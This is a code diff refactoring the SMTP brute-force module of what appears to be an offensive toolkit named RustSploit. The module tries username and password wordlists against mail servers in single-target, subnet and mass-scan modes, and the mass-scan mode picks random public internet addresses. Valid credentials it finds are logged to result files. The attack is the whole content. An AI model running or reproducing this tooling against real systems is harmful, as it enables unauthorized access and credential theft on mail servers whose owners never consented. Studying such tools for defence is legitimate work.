@@ -1,466 +1,198 @@
 use anyhow::{anyhow, Context, Result};
 use colored::*;
-use std::net::{ToSocketAddrs, IpAddr, SocketAddr};
+use std::net::{ToSocketAddrs, IpAddr};
 use std::net::TcpStream;
-use std::sync::{
-    atomic::{AtomicBool, AtomicUsize, Ordering},
-    Arc,
-};
+use std::sync::Arc;
 use std::time::Duration;
-use tokio::sync::{Mutex, Semaphore};
-use futures::stream::{FuturesUnordered, StreamExt};
 use std::io::{BufRead, BufReader, Write};
 use base64::{engine::general_purpose, Engine as _};
-use tokio::io::AsyncWriteExt;
-use tokio::fs::OpenOptions;
 
 use crate::utils::{
     load_lines,
     cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
 };
-use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions, is_subnet_target, parse_subnet, subnet_host_count};
+use crate::modules::creds::utils::{
+    BruteforceConfig, LoginResult, SubnetScanConfig,
+    generate_combos, run_bruteforce, run_subnet_bruteforce,
+    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
+};
 
-const STATE_FILE: &str = "smtp_hose_state.log";
-const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
-
-// Hardcoded exclusions
-const EXCLUDED_RANGES: &[&str] = &[
-    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
-    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
-    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
-    // Cloudflare
-    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
-    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
-    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
-    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
-    "1.1.1.1/32", "1.0.0.1/32",
-    // Google
-    "8.8.8.8/32", "8.8.4.4/32"
-];
-
-#[derive(Clone)]
-struct SmtpBruteforceConfig {
-    target: String,
-    port: u16,
-    username_wordlist: String,
-    password_wordlist: String,
-    threads: usize,
-    stop_on_success: bool,
-    verbose: bool,
-    full_combo: bool,
-    output_file: String,
-    delay_ms: u64,
+pub fn info() -> crate::module_info::ModuleInfo {
+    crate::module_info::ModuleInfo {
+        name: "SMTP Brute Force".to_string(),
+        description: "Brute-force SMTP authentication supporting PLAIN and LOGIN mechanisms. Tests credentials against mail servers with combo mode and subnet scanning.".to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: crate::module_info::ModuleRank::Normal,
+    }
 }
 
 pub async fn run(target: &str) -> Result<()> {
-    println!("\n{}", "=== SMTP Bruteforce Module (RustSploit) ===".bold().cyan());
-    println!();
+    crate::mprintln!("\n{}", "=== SMTP Bruteforce Module (RustSploit) ===".bold().cyan());
+    crate::mprintln!();
 
-    // Check for Mass Scan Mode conditions
-    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();
+    // --- Mass Scan Mode ---
+    if is_mass_scan_target(target) {
+        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
+        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());
 
-    if is_mass_scan {
-        println!("{}", format!("[*] Target: {}", target).cyan());
-        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
-        return run_mass_scan(target).await;
+        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let users = load_lines(&usernames_file)?;
+        let passes = load_lines(&passwords_file)?;
+        if users.is_empty() { return Err(anyhow!("User list empty")); }
+        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
+        let users = Arc::new(users);
+        let passes = Arc::new(passes);
+
+        return run_mass_scan(target, MassScanConfig {
+            protocol_name: "SMTP",
+            default_port: 25,
+            state_file: "smtp_hose_state.log",
+            default_output: "smtp_mass_results.txt",
+            default_concurrency: 500,
+        }, move |ip: IpAddr, port: u16| {
+            let users = users.clone();
+            let passes = passes.clone();
+            async move {
+                // Quick connect check
+                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
+                    return None;
+                }
+
+                let target_str = ip.to_string();
+                for user in users.iter() {
+                    for pass in passes.iter() {
+                        let t = target_str.clone();
+                        let u = user.clone();
+                        let p = pass.clone();
+                        let res = tokio::task::spawn_blocking(move || {
+                            try_smtp_login(&t, port, &u, &p)
+                        }).await;
+
+                        match res {
+                            Ok(Ok(true)) => {
+                                let msg = format!("{} -> {}:{}", target_str, user, pass);
+                                crate::mprintln!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
+                                return Some(format!("{}\n", msg));
+                            }
+                            Ok(Err(e)) => {
+                                let err = e.to_string().to_lowercase();
+                                if err.contains("refused") || err.contains("timeout") || err.contains("reset") {
+                                    return None;
+                                }
+                            }
+                            _ => {}
+                        }
+                    }
+                }
+                None
+            }
+        }).await;
     }
 
+    // --- Subnet Scan Mode ---
     if is_subnet_target(target) {
-        println!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
-        return run_subnet_scan(target).await;
+        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
+
+        let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535).await? as u16;
+        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let users = load_lines(&usernames_file)?;
+        let passes = load_lines(&passwords_file)?;
+        if users.is_empty() { return Err(anyhow!("User list empty")); }
+        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
+
+        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
+        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+        let output_file = cfg_prompt_output_file("output_file", "Output result file", "smtp_subnet_results.txt").await?;
+
+        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
+            concurrency,
+            verbose,
+            output_file,
+            service_name: "smtp",
+            source_module: "creds/generic/smtp_bruteforce",
+            skip_tcp_check: false,
+        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
+            async move {
+                let target_str = ip.to_string();
+                let res = tokio::task::spawn_blocking(move || {
+                    try_smtp_login(&target_str, port, &user, &pass)
+                }).await;
+                match res {
+                    Ok(Ok(true)) => LoginResult::Success,
+                    Ok(Ok(false)) => LoginResult::AuthFailed,
+                    Ok(Err(e)) => LoginResult::Error {
+                        message: e.to_string(),
+                        retryable: true,
+                    },
+                    Err(e) => LoginResult::Error {
+                        message: format!("Task panic: {}", e),
+                        retryable: false,
+                    },
+                }
+            }
+        }).await;
     }
 
-    // --- Standard Single Target Logic ---
-    
-    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535)? as u16;
-    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file")?;
-    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file")?;
-    
-    let threads = cfg_prompt_int_range("threads", "Threads", 8, 1, 256)? as usize;
-    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000)? as u64;
-    
-    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", true)?;
-    let full_combo = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false)?;
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
-    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "smtp_results.txt")?;
+    // --- Single Target Mode ---
+    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535).await? as u16;
+    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
+    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;
 
-    let config = SmtpBruteforceConfig {
+    let threads = cfg_prompt_int_range("threads", "Threads", 8, 1, 256).await? as usize;
+    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000).await? as u64;
+
+    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", true).await?;
+    let combo_mode = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false).await?;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "smtp_results.txt").await?;
+
+    let usernames = load_lines(&username_wordlist)?;
+    let passwords = load_lines(&password_wordlist)?;
+    if usernames.is_empty() || passwords.is_empty() {
+        anyhow::bail!("Username or password list is empty — nothing to bruteforce");
+    }
+    crate::mprintln!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());
+
+    let combos = generate_combos(&usernames, &passwords, combo_mode);
+
+    let try_login = move |target: String, port: u16, user: String, pass: String| {
+        async move {
+            let res = tokio::task::spawn_blocking(move || {
+                try_smtp_login(&target, port, &user, &pass)
+            }).await;
+            match res {
+                Ok(Ok(true)) => LoginResult::Success,
+                Ok(Ok(false)) => LoginResult::AuthFailed,
+                Ok(Err(e)) => LoginResult::Error {
+                    message: e.to_string(),
+                    retryable: true,
+                },
+                Err(e) => LoginResult::Error {
+                    message: format!("Task panic: {}", e),
+                    retryable: false,
+                },
+            }
+        }
+    };
+
+    let result = run_bruteforce(&BruteforceConfig {
         target: target.to_string(),
         port,
-        username_wordlist,
-        password_wordlist,
-        threads,
+        concurrency: threads,
         stop_on_success,
         verbose,
-        full_combo,
-        output_file,
         delay_ms,
-    };
+        max_retries: 2,
+        service_name: "smtp",
+        source_module: "creds/generic/smtp_bruteforce",
+    }, combos, try_login).await?;
 
-    println!();
-    run_smtp_bruteforce(config).await
-}
-
-async fn run_mass_scan(target: &str) -> Result<()> {
-    // Prep
-    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535)? as u16;
-    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
-    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
-    
-    let users = load_lines(&usernames_file)?;
-    let pass_lines = load_lines(&passwords_file)?;
-
-    if users.is_empty() { return Err(anyhow!("User list empty")); }
-    if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }
-
-    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts to scan", 500, 1, 10000)? as usize;
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?; 
-    let output_file = cfg_prompt_output_file("output_file", "Output result file", "smtp_mass_results.txt")?;
-
-    // Parse exclusions
-    let exclusions = Arc::new(parse_exclusions(EXCLUDED_RANGES));
-
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-    let stats_checked = Arc::new(AtomicUsize::new(0));
-    let stats_found = Arc::new(AtomicUsize::new(0));
-
-    let creds_pkg = Arc::new((users, pass_lines));
-
-    // Stats
-    let s_checked = stats_checked.clone();
-    let s_found = stats_found.clone();
-    tokio::spawn(async move {
-        loop {
-            tokio::time::sleep(Duration::from_secs(5)).await;
-            println!(
-                "[*] Status: {} IPs scanned, {} valid SMTP credentials found",
-                s_checked.load(Ordering::Relaxed),
-                s_found.load(Ordering::Relaxed).to_string().green().bold()
-            );
-        }
-    });
-
-    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";
-
-    if run_random {
-        println!("{}", "[*] Starting Random Internet Scan...".green());
-        loop {
-             let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
-             let exc = exclusions.clone();
-             let cp = creds_pkg.clone();
-             let sc = stats_checked.clone();
-             let sf = stats_found.clone();
-             let of = output_file.clone();
-             
-             tokio::spawn(async move {
-                 let ip = generate_random_public_ip(&exc);
-                 if !is_ip_checked(&ip, STATE_FILE).await {
-                     mark_ip_checked(&ip, STATE_FILE).await;
-                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
-                 }
-                 sc.fetch_add(1, Ordering::Relaxed);
-                 drop(permit);
-             });
-        }
-    } else {
-        // File Mode
-        let content = tokio::fs::read_to_string(target).await.unwrap_or_default();
-        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
-        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());
-
-        for ip_str in lines {
-             let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
-             let cp = creds_pkg.clone();
-             let sc = stats_checked.clone();
-             let sf = stats_found.clone();
-             let of = output_file.clone();
-             
-             if let Ok(ip) = ip_str.parse::<IpAddr>() {
-                 tokio::spawn(async move {
-                    if !is_ip_checked(&ip, STATE_FILE).await {
-                        mark_ip_checked(&ip, STATE_FILE).await;
-                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
-                    }
-                    sc.fetch_add(1, Ordering::Relaxed);
-                    drop(permit);
-                 });
-             } else {
-                 drop(permit); 
-             }
-        }
-        for _ in 0..concurrency {
-            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
-        }
-    }
-    
-    Ok(())
-}
-
-async fn run_subnet_scan(target: &str) -> Result<()> {
-    let network = parse_subnet(target)?;
-    let count = subnet_host_count(&network);
-    println!("{}", format!("[*] Subnet {} — {} hosts to scan", target, count).cyan());
-
-    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535)? as u16;
-    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
-    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
-    let users = load_lines(&usernames_file)?;
-    let passes = load_lines(&passwords_file)?;
-    if users.is_empty() { return Err(anyhow!("User list empty")); }
-    if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
-
-    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)? as usize;
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
-    let output_file = cfg_prompt_output_file("output_file", "Output result file", "smtp_subnet_results.txt")?;
-
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-    let stats_checked = Arc::new(AtomicUsize::new(0));
-    let stats_found = Arc::new(AtomicUsize::new(0));
-    let creds_pkg = Arc::new((users, passes));
-    let total = count;
-
-    let s_checked = stats_checked.clone();
-    let s_found = stats_found.clone();
-    tokio::spawn(async move {
-        loop {
-            tokio::time::sleep(Duration::from_secs(5)).await;
-            println!("[*] Status: {}/{} IPs scanned, {} valid credentials found",
-                s_checked.load(Ordering::Relaxed), total,
-                s_found.load(Ordering::Relaxed).to_string().green().bold());
-        }
-    });
-
-    for ip in network.iter() {
-        let permit = semaphore.clone().acquire_owned().await.context("Semaphore")?;
-        let cp = creds_pkg.clone();
-        let sc = stats_checked.clone();
-        let sf = stats_found.clone();
-        let of = output_file.clone();
-
-        tokio::spawn(async move {
-            mass_scan_host(ip, port, cp, sf, of, verbose).await;
-            sc.fetch_add(1, Ordering::Relaxed);
-            drop(permit);
-        });
-    }
-
-    for _ in 0..concurrency {
-        let _ = semaphore.acquire().await.context("Semaphore")?;
-    }
-
-    println!("\n{}", format!("[*] Subnet scan complete. {} hosts scanned, {} credentials found.",
-        stats_checked.load(Ordering::Relaxed),
-        stats_found.load(Ordering::Relaxed)).cyan().bold());
-    Ok(())
-}
-
-async fn mass_scan_host(
-    ip: IpAddr, 
-    port: u16,
-    creds: Arc<(Vec<String>, Vec<String>)>,
-    stats_found: Arc<AtomicUsize>,
-    output_file: String,
-    verbose: bool
-) {
-    let sa = SocketAddr::new(ip, port);
-    
-    // 1. Connection Check
-    if tokio::time::timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), tokio::net::TcpStream::connect(&sa)).await.is_err() {
-        return;
-    }
-
-    let (users, passes) = &*creds;
-
-    // 2. Bruteforce
-    // Reuse existing blocking sync function inside spawn_blocking?
-    // The existing function uses std::net::TcpStream blocking.
-    // That's fine for small lists, but suboptimal for high concurrency.
-    // However, since we are inside a spawned tokio task, spawn_blocking is appropriate.
-    
-    let target_str = ip.to_string();
-
-    for user in users {
-        for pass in passes {
-            let t_target = target_str.clone();
-            let t_user = user.clone();
-            let t_pass = pass.clone();
-            let t_port = port;
-            
-            let t_target_inner = t_target.clone();
-            let t_user_inner = t_user.clone();
-            let t_pass_inner = t_pass.clone();
-            
-            // Blocking call for the actual SMTP interaction (since it uses blocking Telnet/TcpStream)
-            let res = tokio::task::spawn_blocking(move || {
-                try_smtp_login(&t_target_inner, t_port, &t_user_inner, &t_pass_inner)
-            }).await;
-
-            match res {
-                Ok(Ok(true)) => {
-                    let msg = format!("{} -> {}:{}", t_target, t_user, t_pass);
-                    println!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
-                    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
-                       let _ = file.write_all(format!("{}\n", msg).as_bytes()).await;
-                    }
-                    stats_found.fetch_add(1, Ordering::Relaxed);
-                    return; // Stop after first success
-                }
-                Ok(Ok(false)) => {
-                    if verbose {
-                        // Auth failed
-                    }
-                }
-                Ok(Err(e)) => {
-                     // Connection error
-                     let err = e.to_string().to_lowercase();
-                     if err.contains("refused") || err.contains("timeout") || err.contains("reset") {
-                         return; // Stop scanning host
-                     }
-                }
-                Err(_) => {
-                    // Start/Join error
-                }
-            }
-        }
-    }
-}
-
-async fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
-    let usernames = load_lines(&config.username_wordlist)?;
-    let passwords = load_lines(&config.password_wordlist)?;
-    
-    let total_attempts = if config.full_combo {
-        usernames.len() * passwords.len()
-    } else {
-        std::cmp::max(usernames.len(), passwords.len())
-    };
-
-    println!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());
-    println!("[*] Total attempts: {}", total_attempts);
-
-    let stats = Arc::new(BruteforceStats::new());
-    let found_creds = Arc::new(Mutex::new(Vec::new()));
-    let stop_signal = Arc::new(AtomicBool::new(false));
-    let start_time = std::time::Instant::now();
-
-    // Start progress reporter
-    let stats_clone = stats.clone();
-    let stop_clone = stop_signal.clone();
-    let progress_handle = tokio::spawn(async move {
-        while !stop_clone.load(Ordering::Relaxed) {
-             tokio::time::sleep(Duration::from_secs(2)).await;
-             stats_clone.print_progress();
-        }
-    });
-
-    let semaphore = Arc::new(Semaphore::new(config.threads));
-    let mut tasks = FuturesUnordered::new();
-
-    // Generate combinations
-    let mut combos = Vec::new();
-    if config.full_combo {
-        for u in &usernames {
-            for p in &passwords {
-                combos.push((u.clone(), p.clone()));
-            }
-        }
-    } else {
-        let max_len = std::cmp::max(usernames.len(), passwords.len());
-        for i in 0..max_len {
-            let u = &usernames[i % usernames.len()];
-            let p = &passwords[i % passwords.len()];
-            combos.push((u.clone(), p.clone()));
-        }
-    }
-
-    // Process combinations
-    for (user, pass) in combos {
-         if config.stop_on_success && stop_signal.load(Ordering::Relaxed) {
-            break;
-         }
-
-         let permit = semaphore.clone().acquire_owned().await?;
-         let config_clone = config.clone();
-         let stats_clone = stats.clone();
-         let found_clone = found_creds.clone();
-         let stop_signal_clone = stop_signal.clone();
-         let user_clone = user.clone();
-         let pass_clone = pass.clone();
-
-         tasks.push(tokio::spawn(async move {
-             let _permit = permit; 
-             
-             if config_clone.stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
-                 return;
-             }
-             
-             // Wrap blocking logic
-             let config_inner = config_clone.clone();
-             let user_inner = user_clone.clone();
-             let pass_inner = pass_clone.clone();
-             let res = tokio::task::spawn_blocking(move || {
-                 match try_smtp_login(&config_inner.target, config_inner.port, &user_inner, &pass_inner) {
-                     Ok(true) => Ok(true),
-                     Ok(false) => Ok(false),
-                     Err(e) => Err(e),
-                 }
-             }).await;
-
-             match res {
-                 Ok(Ok(true)) => {
-                     println!("\r{}", format!("[+] Found: {}:{}", user_clone, pass_clone).green().bold());
-                     found_clone.lock().await.push((user_clone.clone(), pass_clone.clone()));
-                     stats_clone.record_success();
-                     if config_clone.stop_on_success {
-                         stop_signal_clone.store(true, Ordering::Relaxed);
-                     }
-                 },
-                 Ok(Ok(false)) => {
-                     stats_clone.record_failure();
-                     if config_clone.verbose {
-                         println!("\r{}", format!("[-] Failed: {}:{}", user_clone, pass_clone).dimmed());
-                     }
-                 },
-                 Ok(Err(e)) => {
-                     stats_clone.record_error(e.to_string()).await;
-                     if config_clone.verbose {
-                          println!("\r{}", format!("[!] Error {}:{}: {}", user_clone, pass_clone, e).red());
-                     }
-                 },
-                 Err(e) => {
-                      stats_clone.record_error(format!("Task panic: {}", e)).await;
-                 }
-             }
-             
-             if config_clone.delay_ms > 0 {
-                 tokio::time::sleep(Duration::from_millis(config_clone.delay_ms)).await;
-             }
-         }));
-         
-         // Memory management: drain completed tasks
-          while let std::task::Poll::Ready(Some(_)) = futures::future::poll_fn(|cx| std::task::Poll::Ready(tasks.poll_next_unpin(cx))).await {}
-    }
-
-    while let Some(_) = tasks.next().await {}
-
-    stop_signal.store(true, Ordering::Relaxed);
-    let _ = progress_handle.await;
-    
-    let elapsed = start_time.elapsed();
-    println!("[*] Elapsed: {:.1}s", elapsed.as_secs_f64());
-    stats.print_final().await;
-    
-    // Save results
-    let found = found_creds.lock().await;
-    if !found.is_empty() {
-        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(&config.output_file) {
-             use std::io::Write;
-             for (u, p) in found.iter() {
-                let _ = writeln!(file, "{}:{}", u, p);
-            }
-            println!("[+] Results saved to {}", config.output_file);
-        }
-    }
+    result.print_found();
+    result.save_to_file(&output_file)?;
 
     Ok(())
 }
@@ -479,7 +211,8 @@ fn read_smtp_line(reader: &mut BufReader<&TcpStream>) -> Result<String> {
 fn try_smtp_login(target: &str, port: u16, username: &str, password: &str) -> Result<bool> {
     let addr = format!("{}:{}", target, port);
     let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
-    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(2000))?;
+    let stream = crate::utils::blocking_tcp_connect(&socket, Duration::from_millis(2000))?;
+    let _ = stream.set_nodelay(true);
     stream.set_read_timeout(Some(Duration::from_millis(2000)))?;
     stream.set_write_timeout(Some(Duration::from_millis(2000)))?;
 
